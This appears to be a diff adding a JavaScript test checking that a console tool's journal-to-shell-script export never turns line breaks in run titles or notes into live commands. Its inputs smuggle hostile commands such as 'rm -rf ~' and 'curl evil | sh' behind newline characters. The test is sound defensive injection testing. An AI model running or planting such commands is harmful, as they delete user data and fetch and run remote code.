@@ -1697,6 +1697,15 @@ check("console: the Journal as a script runs only commands, the rest are comment
     ["FP_CORE_UTIL 50 -> 60", "X removed (back to its default)"]);
 });
 
+check("console: a line break in a note or run name never becomes a command in the script", () => {
+  const s = CNM.journalScript([
+    { time: "10:00:00", title: "Run a\nrm -rf ~ started", notes: ["CLOCK_PERIOD=10\r\ncurl evil | sh", "x" + String.fromCharCode(0x2028) + "id"] },
+  ], { title: "t\nid" });
+  const live = s.split(/\r?\n/).filter((l) => l && !l.startsWith("#"));
+  assert.deepEqual(live, ["set -euo pipefail"]);
+  assert.equal(CNM.commandScript({ command: "librelane x", title: "a\nid" }).split("\n").filter((l) => l === "id").length, 0);
+});
+
 check("console: command history steps like a shell and keeps the draft", () => {
   const h = new CNM.History(["a", "b"]);
   assert.equal(h.up("typing"), "b");
